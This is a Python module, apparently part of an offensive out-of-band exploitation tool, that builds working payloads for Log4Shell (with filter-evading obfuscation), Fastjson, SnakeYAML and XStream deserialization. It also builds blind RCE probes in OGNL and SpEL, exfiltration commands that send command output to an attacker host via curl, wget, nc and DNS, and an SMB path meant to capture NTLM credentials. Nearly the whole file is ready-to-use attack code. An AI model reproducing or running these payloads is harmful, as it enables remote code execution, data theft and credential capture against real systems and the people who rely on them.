"""Pure-Python JNDI URL & inline-payload builder (no sidecar needed)."""
from __future__ import annotations

import base64
from typing import Any

from ..config import Settings


def jndi_ldap_url(token: str, settings: Settings, class_name: str = "Exploit") -> str:
    return f"{settings.ldap_base}/{token}/{class_name}"


def jndi_rmi_url(token: str, settings: Settings, class_name: str = "Exploit") -> str:
    return f"{settings.rmi_base}/{token}/{class_name}"


def log4shell_string(token: str, settings: Settings, protocol: str = "ldap", obfuscate: str = "none") -> str:
    host = f"{settings.public_address}:{settings.ldap_port if protocol == 'ldap' else settings.rmi_port}"
    inner = f"{protocol}://{host}/{token}"
    raw = f"${{jndi:{inner}}}"
    if obfuscate == "upper_lookup":
        raw = raw.replace("jndi", "${'jndi'.toUpperCase()}")
    elif obfuscate == "lower_lookup":
        raw = raw.replace("jndi", "${'JNDI'.toLowerCase()}")
    elif obfuscate == "date_format":
        raw = raw.replace("jndi", "${date:j}ndi")
    elif obfuscate == "nested":
        raw = raw.replace("jndi", "$${lower:j}${lower:n}${lower:d}${lower:i}")
    return raw


def fastjson_payload(token: str, settings: Settings, protocol: str = "ldap") -> str:
    url = jndi_ldap_url(token, settings) if protocol == "ldap" else jndi_rmi_url(token, settings)
    return (
        '{"@type":"com.sun.rowset.JdbcRowSetImpl",'
        f'"dataSourceName":"{url}",'
        '"autoCommit":true}'
    )


def snakeyaml_payload(token: str, settings: Settings, mode: str = "spi") -> str:
    url = jndi_ldap_url(token, settings)
    if mode == "spi":
        jar_url = f"{settings.http_base}/callback/http/{token}/spi.jar"
        return (
            "!!javax.script.ScriptEngineManager\n"
            f"- !!java.net.URLClassLoader\n"
            f"  - !!java.net.URL [{jar_url}]"
        )
    if mode == "script_engine":
        return (
            "!!com.sun.rowset.JdbcRowSetImpl\n"
            f"  dataSourceName: {url}\n"
            "  autoCommit: true"
        )
    # c3p0
    jar_url = f"{settings.http_base}/callback/http/{token}/spi.jar"
    return (
        "!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n"
        f"  jndiName: {url}\n"
        "  loginTimeout: 0"
    )


def xstream_payload(cmd: str, chain: str = "EventHandler") -> str:
    if chain == "EventHandler":
        return (
            "<sorted-set>\n"
            "  <string>foo</string>\n"
            "  <dynamic-proxy>\n"
            "    <interface>java.lang.Comparable</interface>\n"
            "    <handler class=\"java.beans.EventHandler\">\n"
            "      <target class=\"java.lang.ProcessBuilder\">\n"
            f"        <command><string>sh</string><string>-c</string><string>{cmd}</string></command>\n"
            "      </target>\n"
            "      <action>start</action>\n"
            "    </handler>\n"
            "  </dynamic-proxy>\n"
            "</sorted-set>"
        )
    return f"<!-- XStream chain '{chain}' — use sidecar for full bytecode generation -->"


def http_exfil_url(token: str, settings: Settings, data_expr: str = "") -> dict[str, str]:
    encoded = base64.urlsafe_b64encode(data_expr.encode()).decode().rstrip("=")
    callback = f"{settings.http_base}/callback/http/{token}/exfil/{encoded}"
    log4j_trigger = f"${{jndi:ldap://{settings.public_address}:{settings.ldap_port}/{token}}}"
    return {
        "callback_url": callback,
        "log4j_trigger": log4j_trigger,
        "curl_example": f"curl '{callback}'",
    }


def dns_exfil_label(token: str, settings: Settings, data_expr: str = "") -> dict[str, str]:
    zone = settings.dns_zone
    return {
        "template_domain": f"{data_expr}.{token}.{zone}",
        "note": "Replace data_expr with actual value at exploit time; needs dns_enabled=true or external resolver",
    }


# ── Blind / 不出网 无回显 payloads ──────────────────────────────────────────

def blind_time_sleep(seconds: int = 5, os: str = "linux") -> dict[str, str]:
    cmds = {
        "linux":   f"sleep {seconds}",
        "windows": f"timeout /t {seconds} /nobreak > nul",
        "auto":    f"sleep {seconds} || timeout /t {seconds} /nobreak > nul",
    }
    cmd = cmds.get(os, cmds["linux"])
    return {
        "cmd": cmd,
        "log4j_el":    f"${{jndi:ldap://${{sys:user.dir}}.x}}",
        "note": f"Inject into command execution context; response delay ≥ {seconds}s confirms RCE",
        "ognl": f"%{{@java.lang.Runtime@getRuntime().exec('{cmd}')}}",
        "spel": f"#{{T(java.lang.Runtime).getRuntime().exec('{cmd}')}}",
    }


def blind_icmp_ping(oob_ip: str, count: int = 3, os: str = "linux") -> dict[str, str]:
    cmd_linux = f"ping -c {count} {oob_ip}"
    cmd_win   = f"ping -n {count} {oob_ip}"
    return {
        "linux_cmd":   cmd_linux,
        "windows_cmd": cmd_win,
        "auto_cmd":    f"{cmd_linux} || {cmd_win}",
        "log4j":       f"${{jndi:ldap://{oob_ip}/ping_oob}}",
        "note":        f"Monitor ICMP packets arriving at {oob_ip}; each ping = 1 hit",
        "ognl":  f"%{{@java.lang.Runtime@getRuntime().exec(new String[]{{\"/bin/ping\",\"-c\",\"{count}\",\"{oob_ip}\"}})}}",
    }


def blind_http_oob(token: str, settings: Settings, data_expr: str = "$(id)", method: str = "curl") -> dict[str, str]:
    cb = f"{settings.http_base}/callback/http/{token}"
    encoded_cb = f"{settings.http_base}/callback/http/{token}/exfil"
    cmds = {
        "curl": f"curl -s '{cb}?data={data_expr}'",
        "wget": f"wget -q -O /dev/null '{cb}?data={data_expr}'",
        "nc":   f"echo -e 'GET /callback/http/{token}?data={data_expr} HTTP/1.0\\r\\n\\r\\n' | nc {settings.public_address} {settings.broker_port}",
    }
    return {
        "cmd": cmds.get(method, cmds["curl"]),
        "callback_url": cb,
        "log4j_nested": f"${{jndi:ldap://{settings.public_address}:{settings.ldap_port}/{token}}}",
        "curl_with_data": f"curl '{cb}?d=$({data_expr})'",
        "note": "Works in air-gapped networks — only needs TCP to OOBserver IP",
    }


def blind_smb_oob(oob_ip: str, share: str = "share") -> dict[str, str]:
    return {
        "unc_path":  f"\\\\{oob_ip}\\{share}",
        "cmd":       f"dir \\\\{oob_ip}\\{share}",
        "powershell": f"$null = ls \\\\{oob_ip}\\{share}",
        "note":       "Triggers NTLM auth — capture with Responder/Impacket on OOBserver",
        "log4j":      f"${{jndi:ldap://{oob_ip}/{share}}}",
    }


def blind_dns_internal(token: str, settings: Settings, data_expr: str = "$(hostname)", dns_zone: str = "") -> dict[str, str]:
    zone = dns_zone or settings.dns_zone
    return {
        "nslookup_cmd":  f"nslookup `{data_expr}`.{token}.{zone} {settings.public_address}",
        "dig_cmd":       f"dig `{data_expr}`.{token}.{zone} @{settings.public_address}",
        "ping_dns":      f"ping -c 1 `{data_expr}`.{token}.{zone}",
        "log4j_expr":    f"${{jndi:dns://{settings.public_address}:{settings.dns_port}/{token}}}",
        "note":          f"Requires OOBX_DNS_ENABLED=true and target can reach {settings.public_address}:{settings.dns_port}/udp",
    }


def blind_file_write(path: str = "/tmp/oob.txt", content: str = "oob_rce_ok") -> dict[str, str]:
    return {
        "linux_cmd":    f"echo '{content}' > {path}",
        "windows_cmd":  f"echo {content} > {path.replace('/','\\\\').lstrip('\\\\')}",
        "verify_linux": f"cat {path}",
        "note":         f"After writing, fetch via known web path or check file existence to confirm RCE",
        "bash_redirect": f"bash -c 'echo {content} > {path}'",
    }
